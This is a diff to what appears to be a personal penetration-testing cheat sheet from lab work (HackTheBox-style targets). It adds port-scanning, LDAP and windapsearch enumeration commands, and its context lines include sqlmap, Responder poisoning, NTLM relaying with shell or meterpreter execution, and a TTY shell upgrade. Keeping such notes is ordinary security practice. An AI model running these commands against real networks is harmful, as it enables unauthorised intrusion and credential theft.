@@ -79,6 +79,7 @@ Helpful resources
  - `nmap --script=smb2-security-mode.nse -p445 <network>/24` find devices with smb signing disabled.
 ### Rustscan
  - `./rustscan -a 10.129.95.185 -r 1-65535` maybe use rustscan to find open ports first, and then use nmap for service detection and stuff.
+ - `rustscan -a 10.10.10.161 -r 1-65535 | grep ^[0-9] |  cut -d '/' -f 1 | tr '\n' ','`, and then can use the ports in nmap
 ### sqlmap
  - `sqlmap -u "http://10.129.29.21/dashboard.php?search=%27" --cookie="PHPSESSID=f0mn05nbrdadh5164gavl9q4un"`
 
@@ -86,6 +87,14 @@ Helpful resources
  - `sudo ./test/bin/python Responder.py -I vboxnet0 -rdwv` listen and respond for LLMNR poisioning.
  - `impacket-ntlmrelayx -tf targets.txt -smb2support` pass the hash, targets.txt has victims ip, `-i` to get interactive smb shell, `-e meterpreter.exe`.
 
+### ldap
+ - `ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161`, -x to check for anonymous login.
+
+### Windapsearch
+ - https://github.com/ropnop/windapsearch
+ - Requirements to install `udo apt-get install libsasl2-dev python3-dev libldap2-dev libssl-dev `.
+ - Enumerate user `python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U `.
+ - `python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom "objectClass=*"`.
 ## Upgrading shell with TTY session
  - `python3 -c 'import pty;pty.spawn("/bin/bash")'`
 ### bash
